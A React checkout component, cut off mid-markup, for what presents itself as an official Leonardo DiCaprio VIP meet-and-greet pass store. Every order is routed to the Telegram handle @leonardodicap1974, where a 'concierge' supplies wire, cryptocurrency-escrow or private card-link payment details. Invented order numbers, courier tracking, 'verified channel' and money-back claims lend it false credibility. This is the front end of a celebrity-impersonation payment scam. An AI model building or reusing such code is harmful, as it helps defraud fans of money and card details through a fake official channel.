import { useState, useId } from 'react';
import {
  X,
  ShoppingBag,
  Trash2,
  Plus,
  Minus,
  ShieldCheck,
  CreditCard,
  Lock,
  Sparkles,
  CheckCircle2,
  QrCode,
  Download,
  Printer,
  Tag,
  ArrowRight,
  Clock,
  Send,
  ExternalLink,
  Copy,
  Check,
  Radio
} from 'lucide-react';
import { CartItem, LuxuryTheme, OrderRecord } from '../types';
import { THEME_CONFIGS, SOCIAL_MEDIA_HANDLES } from '../data/diCaprioData';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  cartItems: CartItem[];
  onUpdateQuantity: (itemId: string, delta: number) => void;
  onRemoveItem: (itemId: string) => void;
  onClearCart: () => void;
  currentTheme: LuxuryTheme;
  onOrderPlaced?: (order: OrderRecord) => void;
  onViewPurchaseHistory?: () => void;
  defaultAttendeeName?: string;
  defaultAttendeeEmail?: string;
}

export function CheckoutModal({
  isOpen,
  onClose,
  cartItems,
  onUpdateQuantity,
  onRemoveItem,
  onClearCart,
  currentTheme,
  onOrderPlaced,
  onViewPurchaseHistory,
  defaultAttendeeName = '',
  defaultAttendeeEmail = '',
}: CheckoutModalProps) {
  const [step, setStep] = useState<'cart' | 'payment' | 'confirmation'>('cart');
  const [promoCode, setPromoCode] = useState('');
  const [discountPercent, setDiscountPercent] = useState(0);
  const [promoMessage, setPromoMessage] = useState<string | null>(null);

  // VIP Attendee details
  const [attendeeName, setAttendeeName] = useState(defaultAttendeeName);
  const [attendeeEmail, setAttendeeEmail] = useState(defaultAttendeeEmail);
  const [attendeeNotes, setAttendeeNotes] = useState('Premier Gala Access — Front Table Preference');
  const [telegramUsername, setTelegramUsername] = useState('@');
  const [paymentPreference, setPaymentPreference] = useState<'wire' | 'concierge_card' | 'crypto'>('wire');
  const [copiedSummary, setCopiedSummary] = useState(false);

  // Card state for optional preview
  const [cardNumber, setCardNumber] = useState('4532 8920 1194 7721');
  const [cardHolder, setCardHolder] = useState(defaultAttendeeName.toUpperCase());
  const [cardExpiry, setCardExpiry] = useState('11/29');
  const [cardCvv, setCardCvv] = useState('884');
  const [isCardFlipped, setIsCardFlipped] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [confirmationOrderNum, setConfirmationOrderNum] = useState('');

  const themeConfig = THEME_CONFIGS[currentTheme];

  if (!isOpen) return null;

  const subtotal = cartItems.reduce((acc, c) => acc + c.item.price * c.quantity, 0);
  const discountAmount = (subtotal * discountPercent) / 100;
  const isAllFree = cartItems.length > 0 && cartItems.every((c) => c.item.price === 0);
  const conciergeFee = (subtotal > 0 && !isAllFree) ? 15 : 0; // Completely free for free passes
  const total = Math.max(0, subtotal - discountAmount + conciergeFee);

  const handleApplyPromo = () => {
    const code = promoCode.trim().toUpperCase();
    if (code === 'OSCAR2026' || code === 'OSCAR') {
      setDiscountPercent(15);
      setPromoMessage('15% Academy Laureate Patron Discount applied!');
    } else if (code === 'TITANIC') {
      setDiscountPercent(10);
      setPromoMessage('10% Titanic 25th Commemorative Discount applied!');
    } else if (code === 'EARTH') {
      setDiscountPercent(12);
      setPromoMessage('12% Earth Alliance Benefactor Match applied!');
    } else {
      setPromoMessage('Invalid code. Try "OSCAR2026" or "EARTH"');
      setDiscountPercent(0);
    }
  };

  const getOrderSummaryText = (orderNum: string) => {
    const itemsList = cartItems.length > 0
      ? cartItems
          .map((ci) => `• ${ci.item.title} (${ci.item.tier || 'VIP Pass'}) x${ci.quantity} — $${(ci.item.price * ci.quantity).toLocaleString()} USD`)
          .join('\n')
      : 'VIP Gala Admission Credentials';

    const paymentLabel =
      paymentPreference === 'wire'
        ? 'Direct Bank Wire / Swift Transfer'
        : paymentPreference === 'concierge_card'
        ? 'Private Concierge Card Invoice'
        : 'Cryptocurrency Escrow (USDT / BTC / ETH)';

    return `🏛️ [LEONARDO DICAPRIO OFFICIAL VIP PASS ORDER]
Order Reference: ${orderNum}
Attendee Name: ${attendeeName}
Email: ${attendeeEmail}
${telegramUsername && telegramUsername.trim() !== '@' ? `Telegram Username: ${telegramUsername}\n` : ''}Payment Method Requested: ${paymentLabel}

Passes Reserved:
${itemsList}

Total Amount Due: $${total.toLocaleString()} USD
Venue: 88th Academy Laureate Gala & Cannes Premiere 2026
Concierge / Seating Notes: ${attendeeNotes || 'Premier Gala Access'}

Requesting official concierge verification approval and provision of official means of payment.`;
  };

  const handleCopySummary = () => {
    const text = getOrderSummaryText(confirmationOrderNum);
    navigator.clipboard.writeText(text);
    setCopiedSummary(true);
    setTimeout(() => setCopiedSummary(false), 3500);
  };

  const handleProcessPayment = (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    setTimeout(() => {
      setIsProcessing(false);
      const generatedId = `LD-2026-VIP-${Math.floor(100000 + Math.random() * 900000)}`;
      setConfirmationOrderNum(generatedId);

      // Create rich OrderRecord
      if (onOrderPlaced) {
        const orderSummaryItems = cartItems.map((ci) => ({
          itemId: ci.item.id,
          title: ci.item.title,
          subtitle: ci.item.subtitle,
          tier: ci.item.tier,
          image: ci.item.image,
          price: ci.item.price,
          quantity: ci.quantity,
        }));

        const isGold = cartItems.some((ci) => ci.item.tier === 'Gold');

        const newOrder: OrderRecord = {
          id: `ord-${Date.now()}`,
          orderNumber: generatedId,
          date: new Date().toLocaleDateString('en-US', {
            month: 'long',
            day: 'numeric',
            year: 'numeric',
          }),
          items: orderSummaryItems,
          subtotal,
          discount: discountAmount,
          conciergeFee,
          totalAmount: total,
          status: 'pending_approval',
          statusLabel: 'Awaiting Telegram Approval & Payment',
          statusDescription: `VIP order logged under ${generatedId}. Routing to official Telegram channel (${SOCIAL_MEDIA_HANDLES.telegram.handle}) for concierge authorization and provision of official payment credentials.`,
          trackingNumber: `TELEGRAM-VIP-AUTH-${Math.floor(10000000 + Math.random() * 90000000)}`,
          courier: 'Brinks Armored White-Glove Courier',
          attendeeName,
          attendeeEmail,
          venueEvent: '88th Academy Laureate Gala & Cannes Premiere 2026',
          venueDate: 'May 24, 2026 · Grand Théâtre Lumière & Hotel du Cap',
          seatZone: isGold ? 'Gold Luminary Greenroom & Front Orchestra' : 'Silver Red Carpet Orchestra',
          qrCodeSerial: `AMPAS-REG-${generatedId}`,
        };

        onOrderPlaced(newOrder);
      }

      // Direct order submission to official Telegram link for approval and means of payment provision
      try {
        window.open(SOCIAL_MEDIA_HANDLES.telegram.url, '_blank', 'noopener,noreferrer');
      } catch {
        // Fallback handled in confirmation UI
      }

      setStep('confirmation');
      onClearCart();
    }, 1200);
  };

  const getCardType = (num: string) => {
    const clean = num.replace(/\s+/g, '');
    if (clean.startsWith('4')) return 'VISA SIGNATURE';
    if (clean.startsWith('5')) return 'MASTERCARD BLACK';
    if (clean.startsWith('3')) return 'AMEX CENTURION';
    return 'TITANIUM VAULT';
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 p-4 sm:p-6 backdrop-blur-2xl animate-in fade-in duration-200">
      <div className="relative w-full max-w-4xl max-h-[92vh] overflow-y-auto rounded-3xl border border-white/20 bg-zinc-950 p-6 sm:p-8 shadow-2xl">
        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 flex h-10 w-10 items-center justify-center rounded-full border border-white/15 bg-white/5 text-zinc-300 hover:bg-white/10 hover:text-white"
          aria-label="Close Checkout"
        >
          <X className="h-5 w-5" />
        </button>

        {/* STEP 1: CART SUMMARY */}
        {step === 'cart' && (
          <div>
            <div className="flex items-center gap-2 mb-2">
              <CreditCard className="h-5 w-5" style={{ color: themeConfig.accent }} />
              <span className="text-xs font-mono uppercase tracking-widest text-amber-300">
                VIP Pass Registry &amp; Allocation
              </span>
            </div>
            <h2 className="font-cinzel text-2xl sm:text-3xl font-black text-white">
              Official VIP Experience Reservation
            </h2>
            <p className="text-xs text-zinc-300 mt-1 mb-6">
              Review your Meet &amp; Greet VIP pass selection and gala credentials before proceeding to white-glove patron registration.
            </p>

            {cartItems.length === 0 ? (
              <div className="py-16 text-center">
                <ShoppingBag className="mx-auto h-12 w-12 text-zinc-600 mb-3" />
                <p className="font-cinzel text-lg text-zinc-300">No VIP passes selected for reservation yet.</p>
                <p className="text-xs text-zinc-500 mt-1">Explore the Meet & Greet VIP Store to select Silver, Gold, or Platinum credentials.</p>
                <button
                  onClick={onClose}
                  className="mt-6 rounded-xl bg-amber-400 px-6 py-2.5 text-xs font-bold uppercase tracking-wider text-black hover:bg-amber-300"
                >
                  Explore VIP Store
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                {/* Cart Items List */}
                <div className="divide-y divide-white/10 rounded-2xl border border-white/10 bg-zinc-900/60 p-4">
                  {cartItems.map(({ item, quantity }) => (
                    <div key={item.id} className="py-4 first:pt-0 last:pb-0 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                      <div className="flex items-center gap-4">
                        <img
                          src={item.image}
                          alt={item.title}
                          className="h-16 w-16 rounded-xl object-cover border border-white/10 bg-zinc-800"
                        />
                        <div>
                          <div className="flex items-center gap-2">
                            <span className="text-[10px] font-mono uppercase font-bold text-amber-300">
                              {item.tier ? `${item.tier} Tier` : item.badge}
                            </span>
                            <span className="text-zinc-600">·</span>
                            <span className="text-[11px] text-zinc-400">{item.subtitle}</span>
                          </div>
                          <h4 className="font-cinzel text-sm sm:text-base font-bold text-white">
                            {item.title}
                          </h4>
                          <span className="font-cinzel text-sm font-semibold text-zinc-200">
                            ${item.price.toLocaleString()} USD
                          </span>
                        </div>
                      </div>

                      {/* Quantity Controls & Delete */}
                      <div className="flex items-center justify-between sm:justify-end gap-4">
                        <div className="flex items-center rounded-xl border border-white/15 bg-white/5 p-1">
                          <button
                            onClick={() => onUpdateQuantity(item.id, -1)}
                            className="h-7 w-7 flex items-center justify-center rounded-lg hover:bg-white/10 text-zinc-300"
                            aria-label="Decrease quantity"
                          >
                            <Minus className="h-3.5 w-3.5" />
                          </button>
                          <span className="w-8 text-center text-xs font-bold text-white">
                            {quantity}
                          </span>
                          <button
                            onClick={() => onUpdateQuantity(item.id, 1)}
                            className="h-7 w-7 flex items-center justify-center rounded-lg hover:bg-white/10 text-zinc-300"
                            aria-label="Increase quantity"
                          >
                            <Plus className="h-3.5 w-3.5" />
                          </button>
                        </div>

                        <span className="font-cinzel text-base font-bold text-white min-w-24 text-right">
                          ${(item.price * quantity).toLocaleString()}
                        </span>

                        <button
                          onClick={() => onRemoveItem(item.id)}
                          className="h-8 w-8 flex items-center justify-center rounded-lg text-zinc-500 hover:text-red-400 hover:bg-white/5"
                          aria-label="Remove item"
                        >
                          <Trash2 className="h-4 w-4" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Promo Code & Summary Calculations */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-start">
                  <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                    <span className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block mb-2">
                      Benefactor / Laureate Promo Code
                    </span>
                    <div className="flex gap-2">
                      <input
                        type="text"
                        value={promoCode}
                        onChange={(e) => setPromoCode(e.target.value)}
                        placeholder="e.g. OSCAR2026, EARTH"
                        className="flex-1 rounded-xl border border-white/15 bg-black/60 px-3 py-2 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-amber-400"
                      />
                      <button
                        onClick={handleApplyPromo}
                        className="rounded-xl border border-amber-400/50 bg-amber-400/20 px-4 py-2 text-xs font-bold text-amber-300 hover:bg-amber-400/30"
                      >
                        Apply
                      </button>
                    </div>
                    {promoMessage && (
                      <p className={`text-xs mt-2 ${discountPercent > 0 ? 'text-emerald-400' : 'text-rose-400'}`}>
                        {promoMessage}
                      </p>
                    )}
                    <span className="text-[10px] text-zinc-500 block mt-2">
                      Official codes: <strong>OSCAR2026</strong> (15% off) or <strong>EARTH</strong> (12% off)
                    </span>
                  </div>

                  {/* Calculations */}
                  <div className="rounded-2xl border border-white/10 bg-zinc-900/60 p-5 space-y-2.5">
                    <div className="flex justify-between text-xs text-zinc-400">
                      <span>Subtotal</span>
                      <span className="font-mono text-zinc-200">${subtotal.toLocaleString()} USD</span>
                    </div>
                    {discountPercent > 0 && (
                      <div className="flex justify-between text-xs text-emerald-400">
                        <span>Patron Discount ({discountPercent}%)</span>
                        <span className="font-mono">-${discountAmount.toLocaleString()} USD</span>
                      </div>
                    )}
                    <div className="flex justify-between text-xs text-zinc-400">
                      <span>White-Glove VIP Concierge & Security</span>
                      <span className="font-mono text-zinc-200">${conciergeFee} USD</span>
                    </div>
                    <div className="border-t border-white/10 pt-3 flex justify-between items-baseline">
                      <span className="font-cinzel text-base font-bold text-white">Grand Total</span>
                      <span className="font-cinzel text-2xl font-extrabold text-amber-300">
                        ${total.toLocaleString()} USD
                      </span>
                    </div>

                    <button
                      onClick={() => setStep('payment')}
                      className="mt-4 w-full flex items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-amber-400 to-amber-600 py-3.5 text-xs font-bold uppercase tracking-wider text-black shadow-xl hover:scale-[1.02] active:scale-[0.98] transition-transform"
                    >
                      <Lock className="h-4 w-4" />
                      <span>Proceed to Encrypted Checkout</span>
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* STEP 2: CREDENTIALS & PAYMENT FORM */}
        {step === 'payment' && (
          <div>
            <div className="flex items-center justify-between border-b border-white/10 pb-4 mb-6">
              <div>
                <span className="text-xs font-mono uppercase tracking-widest text-[#229ED9] flex items-center gap-1.5 font-bold">
                  <Send className="h-3 w-3" />
                  Step 2 of 2 · Telegram Concierge Protocol
                </span>
                <h2 className="font-cinzel text-2xl sm:text-3xl font-black text-white">
                  VIP Attendee Registration &amp; Order Submission
                </h2>
              </div>
              <button
                onClick={() => setStep('cart')}
                className="text-xs text-zinc-400 hover:text-white underline"
              >
                Back to Selection
              </button>
            </div>

            <form onSubmit={handleProcessPayment} className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              {/* Left Column: Telegram Protocol Notice + 3D Credential Preview */}
              <div className="lg:col-span-5 flex flex-col justify-between space-y-6">
                <div>
                  {/* Telegram Direct Concierge Banner */}
                  <div className="rounded-2xl border border-cyan-400/40 bg-gradient-to-b from-[#229ED9]/15 via-black/80 to-zinc-950 p-5 shadow-xl relative overflow-hidden mb-6">
                    <div className="flex items-center justify-between mb-3">
                      <span className="inline-flex items-center gap-1.5 rounded-full border border-cyan-400/50 bg-[#229ED9]/20 px-3 py-1 text-[11px] font-mono font-bold uppercase text-cyan-300">
                        <Radio className="h-3 w-3 animate-pulse text-cyan-400" />
                        Telegram #1 Channel
                      </span>
                      <span className="text-[11px] font-mono text-zinc-400">@leonardodicap1974</span>
                    </div>

                    <h3 className="font-cinzel text-base font-bold text-white mb-1.5 flex items-center gap-2">
                      <Send className="h-4 w-4 text-cyan-400" />
                      <span>Official Concierge Approval</span>
                    </h3>
                    <p className="text-xs text-zinc-300 leading-relaxed">
                      Due to strict gala seating quotas and high demand for Leonardo DiCaprio&apos;s VIP passes, all orders are submitted directly to Leonardo&apos;s verified Telegram channel for attendee identity verification and personalized provision of authorized payment means.
                    </p>

                    <div className="mt-3 pt-3 border-t border-white/10 flex items-center justify-between text-[11px]">
                      <span className="text-zinc-400">Verified Protocol:</span>
                      <a
                        href={SOCIAL_MEDIA_HANDLES.telegram.url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-cyan-300 font-mono font-semibold underline flex items-center gap-1 hover:text-white"
                      >
                        <span>t.me/leonardodicap1974</span>
                        <ExternalLink className="h-3 w-3" />
                      </a>
                    </div>
                  </div>

                  {/* 3D CREDIT CARD / CREDENTIAL DISPLAY */}
                  <span className="text-xs font-semibold uppercase tracking-wider text-zinc-400 block mb-3">
                    VIP Credential Visualizer:
                  </span>
                  <div className="perspective-1000 mb-6">
                    <div
                      className="relative h-52 w-full rounded-2xl p-6 transition-transform duration-700 transform-style-3d shadow-2xl flex flex-col justify-between overflow-hidden cursor-pointer"
                      onClick={() => setIsCardFlipped(!isCardFlipped)}
                      style={{
                        transform: `rotateY(${isCardFlipped ? 180 : 0}deg)`,
                        background: 'linear-gradient(135deg, #18181b 0%, #27272a 50%, #09090b 100%)',
                        border: '1px solid rgba(212, 175, 55, 0.4)',
                        boxShadow: '0 0 35px rgba(212, 175, 55, 0.25)',
                      }}
                      title="Click to flip credential"
                    >
                      {/* Holographic shimmer */}
                      <div className="pointer-events-none absolute inset-0 hologram-shimmer opacity-25" />

                      {/* FRONT OF CARD */}
                      <div className="backface-hidden flex flex-col justify-between h-full">
                        <div className="flex items-center justify-between">
                          <div className="h-8 w-11 rounded-md bg-gradient-to-tr from-amber-400 via-amber-200 to-amber-500 border border-amber-200/60 shadow-inner flex items-center justify-center">
                            <div className="h-4 w-6 rounded-xs border border-black/40" />
                          </div>
                          <span className="font-mono text-xs font-extrabold tracking-widest text-amber-300">
                            {getCardType(cardNumber)}
                          </span>
                        </div>

                        <div className="font-mono text-lg sm:text-xl font-bold tracking-[0.2em] text-white my-3 drop-shadow">
                          {cardNumber || '•••• •••• •••• ••••'}
                        </div>

                        <div className="flex items-center justify-between text-[11px] text-zinc-300">
                          <div>
                            <span className="block text-[8px] uppercase tracking-wider text-zinc-500">Cardholder</span>
                            <span className="font-mono font-bold tracking-wider uppercase">{cardHolder || 'ATTENDEE NAME'}</span>
                          </div>
                          <div>
                            <span className="block text-[8px] uppercase tracking-wider text-zinc-500">Status</span>
                            <span className="font-mono font-bold text-cyan-300">PENDING TG APPROVAL</span>
                          </div>
                        </div>
                      </div>

                      {/* BACK OF CARD */}
                      <div className="absolute inset-0 p-6 rotate-y-180 backface-hidden flex flex-col justify-between bg-zinc-950">
                        <div className="h-10 w-full bg-black -mx-6 mt-2" />
                        <div className="flex items-center justify-end bg-white/20 px-3 py-1.5 rounded">
                          <span className="text-[10px] text-zinc-400 mr-2">VERIFICATION:</span>
                          <span className="font-mono text-sm font-bold text-cyan-300">@leonardodicap1974</span>
                        </div>
                        <p className="text-[9px] text-zinc-400 leading-tight">
                          Authorized luxury credential for Leonardo DiCaprio 2026 Gala. Official payment instructions provisioned directly through Telegram.
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Security Highlights */}
                  <div className="rounded-2xl border border-white/10 bg-white/5 p-4 space-y-2 text-xs text-zinc-400">
                    <div className="flex items-center gap-2 text-emerald-400 font-semibold">
                      <ShieldCheck className="h-4 w-4" />
                      <span>Direct Official Channel Guarantee</span>
                    </div>
                    <p className="text-[11px] leading-relaxed">
                      All payment arrangements and invoice provisions are handled securely by Leonardo&apos;s verified team. 100% money-back guarantee in case of rescheduling.
                    </p>
                  </div>
                </div>

                <div className="mt-4 pt-4 border-t border-white/10 flex justify-between items-baseline">
                  <span className="text-xs uppercase text-zinc-400">Total Order Value:</span>
                  <span className="font-cinzel text-2xl font-black text-amber-300">
                    ${total.toLocaleString()} USD
                  </span>
                </div>
              </div>

              {/* Right Column: Registration & Payment Provision Selection */}
              <div className="lg:col-span-7 space-y-4">
                <div className="rounded-2xl border border-white/10 bg-zinc-900/60 p-5 space-y-4">
                  <span className="text-xs font-semibold uppercase tracking-wider text-amber-300 block">
                    1. Attendee Pass Credentials
                  </span>

                  <div>
                    <label className="text-[11px] text-zinc-400 block mb-1">
                      Full Legal Name (Engraved on Physical Metal Pass):
                    </label>
                    <input
                      type="text"
                      required
                      value={attendeeName}
                      onChange={(e) => {
                        setAttendeeName(e.target.value);
                        setCardHolder(e.target.value.toUpperCase());
                      }}
                      className="w-full rounded-xl border border-white/15 bg-black/60 px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400"
                    />
                  </div>

                  <div>
                    <label className="text-[11px] text-zinc-400 block mb-1">
                      VIP Dispatch Email (For Pass Credentials &amp; Venue Directions):
                    </label>
                    <input
                      type="email"
                      required
                      value={attendeeEmail}
                      onChange={(e) => setAttendeeEmail(e.target.value)}
                      className="w-full rounded-xl border border-white/15 bg-black/60 px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400"
                    />
                  </div>

                  <div>
                    <label className="text-[11px] text-zinc-400 block mb-1">
                      Your Telegram Username (Optional — for instant queue matching):
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        value={telegramUsername}
                        onChange={(e) => setTelegramUsername(e.target.value)}
                        placeholder="@username"
                        className="w-full rounded-xl border border-cyan-400/30 bg-black/60 px-3.5 py-2.5 text-xs font-mono text-cyan-300 placeholder-zinc-600 focus:outline-none focus:border-cyan-400"
                      />
                      <Send className="absolute right-3.5 top-3 h-3.5 w-3.5 text-cyan-400 opacity-60" />
                    </div>
                  </div>

                  <div>
                    <label className="text-[11px] text-zinc-400 block mb-1">
                      Concierge Notes / Dietary Preferences / Seating:
                    </label>
                    <input
                      type="text"
                      value={attendeeNotes}
                      onChange={(e) => setAttendeeNotes(e.target.value)}
                      className="w-full rounded-xl border border-white/15 bg-black/60 px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400"
                    />
                  </div>
                </div>

                {/* Means of Payment Provision Selection */}
                <div className="rounded-2xl border border-white/10 bg-zinc-900/60 p-5 space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold uppercase tracking-wider text-amber-300 block">
                      2. Preferred Means of Payment (Provisioned on Telegram)
                    </span>
                    <span className="text-[10px] font-mono text-cyan-300">Concierge Invoicing</span>
                  </div>
                  <p className="text-[11px] text-zinc-400">
                    Select your preferred means of settlement. Official payment coordinates will be issued directly by the concierge in the official Telegram channel:
                  </p>

                  <div className="space-y-2.5">
                    {/* Option 1: Wire */}
                    <label
                      onClick={() => setPaymentPreference('wire')}
                      className={`flex items-start gap-3 rounded-xl border p-3.5 cursor-pointer transition-all ${
                        paymentPreference === 'wire'
                          ? 'border-amber-400/60 bg-amber-400/10 shadow-lg'
                          : 'border-white/10 bg-black/40 hover:border-white/25'
                      }`}
                    >
                      <input
                        type="radio"
                        name="payment_pref"
                        checked={paymentPreference === 'wire'}
                        onChange={() => setPaymentPreference('wire')}
                        className="mt-1 accent-amber-400"
                      />
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white">Direct Bank Wire / Swift Transfer</span>
                          <span className="text-[10px] font-mono rounded bg-white/10 px-2 py-0.5 text-amber-300">Recommended</span>
                        </div>
                        <p className="text-[11px] text-zinc-400 mt-0.5">
                          Official institutional escrow coordinates issued directly via Telegram. Zero transaction fee.
                        </p>
                      </div>
                    </label>

                    {/* Option 2: Card Link */}
                    <label
                      onClick={() => setPaymentPreference('concierge_card')}
                      className={`flex items-start gap-3 rounded-xl border p-3.5 cursor-pointer transition-all ${
                        paymentPreference === 'concierge_card'
                          ? 'border-cyan-400/60 bg-[#229ED9]/10 shadow-lg'
                          : 'border-white/10 bg-black/40 hover:border-white/25'
                      }`}
                    >
                      <input
                        type="radio"
                        name="payment_pref"
                        checked={paymentPreference === 'concierge_card'}
                        onChange={() => setPaymentPreference('concierge_card')}
                        className="mt-1 accent-cyan-400"
                      />
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white">Private Concierge Card Invoice Link</span>
                          <span className="text-[10px] font-mono rounded bg-white/10 px-2 py-0.5 text-cyan-300">256-Bit Link</span>
                        </div>
                        <p className="text-[11px] text-zinc-400 mt-0.5">
                          Private tokenized checkout link for Visa, Mastercard, or Centurion Amex sent in private chat.
                        </p>
                      </div>
                    </label>

                    {/* Option 3: Crypto */}
                    <label
                      onClick={() => setPaymentPreference('crypto')}
                      className={`flex items-start gap-3 rounded-xl border p-3.5 cursor-pointer transition-all ${
                        paymentPreference === 'crypto'
                          ? 'border-emerald-400/60 bg-emerald-500/10 shadow-lg'
                          : 'border-white/10 bg-black/40 hover:border-white/25'
                      }`}
                    >
                      <input
                        type="radio"
                        name="payment_pref"
                        checked={paymentPreference === 'crypto'}
                        onChange={() => setPaymentPreference('crypto')}
                        className="mt-1 accent-emerald-400"
                      />
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white">Cryptocurrency Escrow (USDT / BTC / ETH)</span>
                          <span className="text-[10px] font-mono rounded bg-white/10 px-2 py-0.5 text-emerald-300">Instant</span>
                        </div>
                        <p className="text-[11px] text-zinc-400 mt-0.5">
                          Verified multi-sig wallet address provided for secure, borderless VIP settlement.
                        </p>
                      </div>
                    </label>
                  </div>
                </div>

                {/* Submit to Telegram Button */}
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="w-full flex items-center justify-center gap-2.5 rounded-xl bg-gradient-to-r from-[#229ED9] via-cyan-400 to-amber-400 py-4 text-xs font-black uppercase tracking-wider text-black shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-transform disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <div className="h-4 w-4 rounded-full border-2 border-black border-t-transparent animate-spin" />
                      <span>Submitting Order &amp; Connecting to Telegram...</span>
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4 text-black fill-black" />
                      <span>
                        {total === 0
                          ? 'Claim Complimentary Pass & Submit to Telegram (FREE · $0 USD)'
                          : `Submit Order to Telegram for Approval & Payment ($${total.toLocaleString()} USD)`}
                      </span>
                    </>
                  )}
                </button>
                <p className="text-[11px] text-center text-zinc-400 leading-normal">
                  Clicking submit locks in your reservation ref and automatically directs you to <strong className="text-cyan-300 font-mono">@leonardodicap1974</strong> on Telegram for concierge approval and payment provisioning.
                </p>
              </div>
            </form>
          </div>
        )}

        {/* STEP 3: ORDER CONFIRMATION & TELEGRAM APPROVAL DIRECTION */}
        {step === 'confirmation' && (
          <div className="py-6 text-center max-w-2xl mx-auto space-y-6">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-cyan-500/20 border border-cyan-500/40 text-cyan-400 animate-in zoom-in-50 duration-300 shadow-lg shadow-cyan-500/20">
              <Send className="h-8 w-8 ml-0.5" />
            </div>

            <div>
              <span className="text-xs font-mono uppercase tracking-widest text-cyan-400 font-bold flex items-center justify-center gap-1.5">
                <Radio className="h-3 w-3 animate-pulse text-cyan-400" />
                Submitted · Directed to Telegram Concierge
              </span>
              <h2 className="font-cinzel text-3xl sm:text-4xl font-black text-white mt-1">
                VIP Pass Created For {attendeeName || 'Individual Patron'}
              </h2>
              <p className="text-xs sm:text-sm text-zinc-300 mt-2">
                Your individual VIP reservation <strong className="text-amber-300 font-mono">{confirmationOrderNum}</strong> has been created. Please complete approval and receive authorized payment coordinates through Leonardo&apos;s verified Telegram channel.
              </p>
            </div>

            {/* HIGHLIGHTED TELEGRAM CALL-TO-ACTION CONTAINER */}
            <div className="rounded-3xl border-2 border-cyan-400/50 bg-gradient-to-b from-[#229ED9]/25 via-zinc-950 to-black p-6 sm:p-7 shadow-2xl relative overflow-hidden text-left space-y-5">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
                <div className="flex items-center gap-3">
                  <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-[#229ED9] text-white shadow-lg shadow-[#229ED9]/40">
                    <Send className="h-6 w-6 ml-0.5" />
                  </div>
                  <div>
                    <h3 className="font-cinzel text-base font-bold text-white flex items-center gap-2">
                      <span>Telegram Concierge Approval</span>
                      <span className="rounded bg-amber-400 text-black px-1.5 py-0.5 text-[9px] font-black uppercase font-mono">
                        #1 Official
                      </span>
                    </h3>
                    <span className="text-xs font-mono text-cyan-300 font-bold">@leonardodicap1974</span>
                  </div>
                </div>

                <div className="sm:text-right">
                  <span className="text-[10px] uppercase font-mono text-zinc-400 block">Status</span>
                  <span className="inline-flex items-center gap-1 rounded-full border border-cyan-400/40 bg-cyan-400/10 px-2.5 py-0.5 text-xs font-bold text-cyan-300">
                    <Clock className="h-3 w-3 animate-spin" />
                    Pending Payment Provision
                  </span>
                </div>
              </div>

              {/* Action Buttons: Open Telegram + Copy Details */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
                <a
                  href={SOCIAL_MEDIA_HANDLES.telegram.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center justify-center gap-2 rounded-xl bg-[#229ED9] px-5 py-3.5 text-xs font-black uppercase tracking-wider text-white shadow-xl hover:bg-[#1a8bc2] hover:scale-[1.02] active:scale-[0.98] transition-all"
                >
                  <Send className="h-4 w-4" />
                  <span>Open Telegram Channel</span>
                  <ExternalLink className="h-3.5 w-3.5 opacity-80" />
                </a>

                <button
                  type="button"
                  onClick={handleCopySummary}
                  className="flex items-center justify-center gap-2 rounded-xl border border-white/20 bg-white/10 px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-white hover:bg-white/20 hover:border-amber-400 transition-all"
                >
                  {copiedSummary ? (
                    <>
                      <Check className="h-4 w-4 text-emerald-400" />
                      <span className="text-emerald-300">Copied to Clipboard!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="h-4 w-4 text-amber-300" />
                      <span>Copy Order Details</span>
                    </>
                  )}
                </button>
              </div>

              {/* 3-Step Protocol Guide */}
              <div className="rounded-2xl border border-white/10 bg-black/60 p-4 space-y-3">
                <span className="text-[11px] font-mono font-bold uppercase tracking-wider text-amber-300 block">
                  Next Steps to Confirm Your Pass:
                </span>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs text-zinc-300">
                  <div className="space-y-1">
                    <span className="text-cyan-300 font-bold font-mono">1. Message Channel</span>
                    <p className="text-[11px] text-zinc-400">
                      Join <strong className="text-white">@leonardodicap1974</strong> and paste or message your Order Ref <strong>{confirmationOrderNum}</strong>.
                    </p>
                  </div>
                  <div className="space-y-1">
                    <span className="text-amber-300 font-bold font-mono">2. Payment Provision</span>
                    <p className="text-[11px] text-zinc-400">
                      The concierge verifies attendee credentials and provides your authorized payment details (Wire / Invoice link / Escrow).
                    </p>
                  </div>
